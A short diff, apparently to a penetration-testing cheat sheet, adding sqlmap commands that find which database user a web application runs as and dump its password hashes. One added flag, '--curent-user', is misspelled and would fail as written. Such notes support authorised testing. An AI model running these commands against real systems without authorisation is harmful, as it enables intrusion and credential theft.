@@ -3428,6 +3428,12 @@ python /path/to/sqlmap -r req.txt -p param_to_attack --timeout=300
 # T = time-based blind
 # Q = inline queries
 --technique BEUSTQ
+
+# check which users webapp runs as
+python /path/to/sqlmap -r req.txt --curent-user
+
+# if run as root, dump password hashes for DB
+python /path/to/sqlmap -r req.txt --passwords
 ```
 
 
